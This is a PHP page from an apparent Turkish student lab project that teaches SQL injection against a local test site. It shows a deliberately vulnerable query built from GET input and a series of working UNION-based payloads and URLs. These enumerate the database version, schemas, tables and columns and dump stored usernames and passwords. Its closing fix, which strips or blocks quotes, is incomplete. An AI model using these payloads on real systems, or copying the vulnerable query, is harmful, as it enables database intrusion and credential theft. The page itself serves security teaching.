<?php
	include 'veritabani.php'; // veritabani ile baglanti kurulur
	if(empty($_SESSION)) // veritabani baglantisi kontrol edilir
	   session_start();
	if(!isset($_SESSION['kull_adi'])){ // kullanici girisi yapilmamis ise
	   header("Location: index.php"); // index.php ye yonlendir
	   exit;
	} 
?>

<html>
	<head>
		<title>YazLab II 3.Proje</title> <!- sayfanin sekme basligi ->
		<link rel="shortcut icon" href="img/icon.ico"> <!- img/icon.ico dosyasini sayfa iconu yapar ->
	</head>
	<body>
		<ul>
			</br><li><b>	SQL Enjeksiyonu Nedir?</b></li>
			<p>&emsp;İnternet sitelerinin bir çocuğunda, sayfayı dinamik tutmak için veritabanından yararlanılır. Güncel veritabanı yazılımlarında birçoğunda SQL denilen ortak bir dil kullanılır.</p>
			<p>&emsp;SQL Enjeksiyonu, SQL sorgusunun amacına müdahale ederek farklı bilgileri elde etmeye denir.</p>
			<p>&emsp;Yani SQL Enjeksiyonu yöntemi ile üye bilgileri, yönetici şifreleri gibi veritabanında bulunup herkese açık olmayan bilgiler elde edilebilir.</p>
			</br><li><b>	Güvensiz kodlama pratiği:</b></li>
			<p>&emsp;$sorgu = "SELECT kullanici_adi, kullanici_sifre FROM kullanici WHERE kullanici_sira = '".$_GET[kull_sira]."'";</br>// Burada kullanici_adi ve kullanici_sifre degerlerini GET ile istenen kull_sira degiskeni sayesinde aliyoruz. </p>
			<p>&emsp;$sorgu_sonuc = mysql_query($sorgu);</br>// $sorgu_sonuc degiskenine $sorgu'nun basarili olup olmadigini dondurur(0/1).</p>
			<p>&emsp;while($satir_sorgu = mysql_fetch_array($sorgu_sonuc)) {</br>// $satir_sorgu degiskenine istenen satirlarin varolup olmadigini dondurur(...2,1,0). '0' dondugunde while dongusu sonlanir.</p>
			<p>&emsp;echo "Kull.sira: {$_GET['kull_sira']}<br />Kull.adi: {$satir_sorgu['kullanici_adi']}<br />Sifresi: {$satir_sorgu['kullanici_sifre']}";</br>// echo komutu ile tablodan alinan kullanici_sira, kullanici_adi, kullanici_sifre bilgileri ekrana yazdirilir.</p>
			<p>&emsp;}</p>
			<p>&emsp;<span style="color:Red">Kullanıcıdan alınan veri kod kısmında tırnak ile alınmış. Tırnak işareti siteye hata verdirir, çünkü sql sorgularında özel bir anlama sahiptir. Bu karakter SQL sorgularındaki WHERE koşullarında yer alan field'ların değerlerini sınırlandırmaya yarayan bir komuttur.</span></p>
			</br><li><b>	Örnek görüntü:</br></b></li>
			<img src="img/sql_enjeksiyon1.png"/></br>
			</br><li><b>	Sömürü:</b></li>
			<p>&emsp;● version() fonksiyonu kullanılan veritabanı yazılımının versiyonunu verir. </p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,version() # </p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2Cversion%28%29+%23</p>
			<img src="img/sql_enjeksiyon2.png"/></br>
			<p>&emsp;● user() fonksiyonu veritabanı yazılımının kullanıcı adını verdirir. </p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,user() # </p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2Cuser%28%29+%23+</p>
			<img src="img/sql_enjeksiyon3.png"/></br>
			<p>&emsp;● database() fonksiyonu mevcut sql sorgusunun kullandığı tablonun yer aldığı veritabanının adını verir. </p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,database() # </p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2Cdatabase%28%29+%23</p>
			<img src="img/sql_enjeksiyon4.png"/></br>
			<p>&emsp;● @@datadir keyword'ü veritabanının yüklü olduğu dizini verir. </p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,@@datadir #</p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2C%40%40datadir+%23</p>
			<img src="img/sql_enjeksiyon5.png"/></br>
			<p>&emsp;● MySQL'de yüklü veritabanlarını gösterme.</p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,schema_name from information_schema.schemata # </p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2Cschema_name+from+information_schema.schemata+%23+</p>
			<img src="img/sql_enjeksiyon6.png"/></br>
			<p>&emsp;● yazlab2_3 adlı veritabanının tablolarını sıralama sorgusu.</p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,group_concat(table_name) from information_schema.tables Where table_schema='yazlab2_3' # </p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2Cgroup_concat%28table_name%29+from+information_schema.tables+Where+table_schema%3D%27yazlab2_3%27+%23+</p>
			<img src="img/sql_enjeksiyon7.png"/></br>
			<p>&emsp;● kullanici tablosunun kolon isimleri ekrana getirme.</p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,group_concat(column_name) from information_schema.columns Where table_name='kullanici' # </p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2Cgroup_concat%28column_name%29+from+information_schema.columns+Where+table_name%3D%27kullanici%27+%23+</p>
			<img src="img/sql_enjeksiyon8.png"/></br>
			<p>&emsp;● Hedef veritabanı tablosunda kayıtlı kullanıcı adları ve şifrelerini ekrana basmış</p>
			<p>Metin Kutusuna Girilecek Kod:</br>99' or '1' = '1' UNION Select 1,group_concat(kullanici_adi,0x3b,kullanici_sifre,0x0a) from yazlab2_3.kullanici #</p>
			<p>URL:</br>http://localhost/YazLab2_3/sql_enjeksiyonu.php?kull_sira=99%27+or+%271%27+%3D+%271%27+UNION+Select+1%2Cgroup_concat%28kullanici_adi%2C0x3b%2Ckullanici_sifre%2C0x0a%29+from+yazlab2_3.kullanici+%23</p>
			<img src="img/sql_enjeksiyon9.png"/></br>
			</br><li><b>	İyileştirme pratiği:</b></li>
			<p>&emsp;<span style="color:Red">Kullanıcıdan gelen veri tırnak içeriyorsa bu olduğu gibi sql sorgusuna katılmamalıdır. Bunun yerine ya tırnak işareti silinip sql sorgusuna dahil edilmelidir ya da tamamen bloklanmalı, yani sql sorgusuna dahil edilmemelidir.</span></p>
		</ul>
	</body>
</html>